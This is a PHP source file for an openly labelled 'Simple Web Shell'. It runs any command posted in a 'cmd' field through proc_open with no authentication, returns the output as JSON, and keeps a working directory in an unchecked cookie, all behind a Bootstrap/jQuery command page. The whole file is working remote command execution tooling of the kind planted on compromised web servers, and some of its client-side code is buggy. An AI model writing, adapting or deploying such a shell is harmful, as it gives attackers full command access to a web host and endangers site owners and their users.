<?php
// set php message log level to error
error_reporting(E_ERROR | E_PARSE);

if (isset($_COOKIE['dir_used']))
{
  chdir($_COOKIE['dir_used']);
  $currentDir = explode("/", $_COOKIE['dir_used']);
}
else
{
  setcookie('dir_used', getcwd(), time() + (86400 * 30), "/");
  chdir($_COOKIE['dir_used']);
  $currentDir = explode("/", $_COOKIE['dir_used']);
}

function my_exec($cmd, $input = '')
{

  $proc = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $pipes);

  fwrite($pipes[0], $input);
  fclose($pipes[0]);

  $stdout = stream_get_contents($pipes[1]);
  fclose($pipes[1]);

  $stderr = stream_get_contents($pipes[2]);
  fclose($pipes[2]);

  $rtn = proc_close($proc);

  $exec_time = microtime(true) - $_SERVER["REQUEST_TIME_FLOAT"];

  return ['stdout' => $stdout,

    'stderr'      => $stderr,

    'return'      => $rtn,

    'current_dir' => getcwd(),

    'exec_time'   => "$exec_time seconds"
  ];

}

if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')
  $url = "https://";
else
  $url = "http://";
// Append the host(domain name, ip) to the URL.   
$url .= $_SERVER['HTTP_HOST'];
// Append the requested resource location to the URL   
$url .= $_SERVER['REQUEST_URI'];
if (isset($_POST['cmd']))
{
  $cmd = $_POST['cmd'];
  // if command "cd" is used, then change directory
  if (substr($cmd, 0, 2) == "cd")
  {
    $path = substr($cmd, 3);
    // check if array dir_used is set
    // set cookie with array dir_used

    $cmd = "ls -la " . $path;

    chdir($path);

    setcookie('dir_used', getcwd(), time() + (86400 * 30), "/");

  }


  $result = my_exec($cmd);

  header('Content-Type: application/json');
  echo json_encode($result, JSON_PRETTY_PRINT || JSON_UNESCAPED_UNICODE || JSON_UNESCAPED_SLASHES || JSON_FORCE_OBJECT);


  // detect shell need a input value, then send it

  die;
}
else
{
  $result = my_exec("ls -la");
  $exec = $result;
}

?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Simple Web Shell</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://bootswatch.com/5/solar/bootstrap.min.css">
  <link rel="stylesheet" href="https://bootswatch.com/5/solar/_variables.scss">
  <link rel="stylesheet" href="https://bootswatch.com/5/solar/_bootswatch.scss">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
</head>

<body>

  <div class="container-fluid pt-3">
    <div class="row">
      <div class="col-md-12">
        <div class="card text-center">
          <div class="card-title mt-4">
            <h3 class="text-success"><i class="bi bi-bug"></i> Simple Web Shell <i class="bi bi-bug"></i></h3>
          </div>
          <div class="card-body">
            <div class="mb-3">

              <nav aria-label="breadcrumb">
                <ol class="breadcrumb">
                  <?php foreach ($currentDir as $key => $value): ?>
                    <li class="breadcrumb-item <?php
                    if ($key == count($currentDir) - 1)
                      echo "active";
                    ?>
                    " aria-current="page">
                      <?= $value ?>
                    </li>
                  <?php endforeach ?>
                </ol>
              </nav>

              <div class="input-group">
                <input class="form-control" name="cmd" id="cmd" placeholder="ls -la" autofocus></input>
                <button type="button" name="sendCmd" id="sendCmd" class="btn btn-dark bi bi-send"></button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="row">
      <div class="col">
        <div class="card text-start">
          <div class="card-body">
            <pre id="result" class="text-success"><?= $exec['stdout'] . "\n" . $exec['exec_time'] ?></pre>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Modal Body -->
  <!-- if you want to close by clicking outside the modal, delete the last endpoint:data-bs-backdrop and data-bs-keyboard -->
  <div class="modal fade" id="modalId" tabindex="-1" data-bs-backdrop="static" data-bs-keyboard="false" role="dialog"
    aria-labelledby="modalTitleId" aria-hidden="true">
    <div class="modal-dialog modal-dialog-scrollable modal-dialog-centered modal-sm" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title" id="modalTitleId">Modal title</h5>
          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
          Body
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>


  <!-- Optional: Place to the bottom of scripts -->
  <script>
    const myModal = new bootstrap.Modal(document.getElementById('modalId'), options)

  </script>


  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script>
  <script>
    $(document).ready(function () {
      let modal = new bootstrap.Modal(document.getElementById('modalId'), {
        keyboard: false
      });





      $("#sendCmd").click(function () {
        var cmd = $("#cmd").val();

        if (cmd.length == 0) {
          // set modal title
          $("#modalTitleId").html("Error");
          // set modal body
          $("#modalId .modal-body").html("Please enter a command");
          // show modal
          modal.show();
          return;
        }

        if (cmd == 'clear' || cmd == 'cls') {
          $("#result").html('');
          return;
        }

        // if command is cd
        if (cmd.startsWith('cd')) {
          // set modal title
          Cookies.set('dir_used', cmd.split(' ')[1]);
        }

        // add disable attribute to button and input
        $("#sendCmd").attr("disabled", true);
        $("#cmd").attr("disabled", true);

        // add html element "<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
        // <span class="visually-hidden">Loading...</span>" to button and remove icon
        $("#sendCmd").html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span><span class="visually-hidden">Loading...</span>');
        $("#sendCmd").removeClass("bi-send");

        $.ajax({
          url: "<?= $url ?>",
          type: "POST",
          data: {
            cmd: cmd
          },
          success: function (data) {
            $("#result").html(data['stdout']) ?? data['stderr'] + "\n" + data['exec_time'];

            // remove disable attribute to button and input
            $("#sendCmd").attr("disabled", false);
            $("#cmd").attr("disabled", false);

            // <span class="visually-hidden">Loading...</span>" to button and add icon
            $("#sendCmd").html('<i class="bi bi-send"></i>');
            // remove span
            $("#sendCmd").find("span").remove();

            // get "current_dir" data from "data" attribute (string)
            let dir_used = data.split('data-current_dir="')[1].split('"')[0];
            // change breadcrumb
            let breadcrumbDir = $(".breadcrumb-item");
            // get current dir
            let currentDir = [];
            breadcrumbDir.each(function (index, element) {
              currentDir.push($(element).html());
            });
            // if dir_used is not in currentDir

            if (!currentDir.includes(dir_used)) {
              // add new dir to breadcrumb
              $(".breadcrumb").append('<li class="breadcrumb-item active" aria-current="page">' + dir_used + '</li>');
            }

          },
          error: function (jqXHR, textStatus, errorThrown) {
            // set modal title 
            $("#modalTitleId").html("Error");
            // set modal body
            $("#modalId .modal-body").html(errorThrown);
            // show modal
            modal.show();


            $("#sendCmd").attr("disabled", false);
            $("#cmd").attr("disabled", false);

            // <span class="visually-hidden">Loading...</span>" to button and add icon
            $("#sendCmd").addClass("bi-send");
            // remove span
            $("#sendCmd").find("span").remove();

            // get "current_dir" data from "data" attribute (string)
            let dir_used = data.split('data-current_dir="')[1].split('"')[0];
            // change breadcrumb
            let breadcrumbDir = $(".breadcrumb-item");
            // get current dir
            let currentDir = [];
            breadcrumbDir.each(function (index, element) {
              currentDir.push($(element).html());
            });
          },
        });
      });
    });
  </script>
</body>

</html>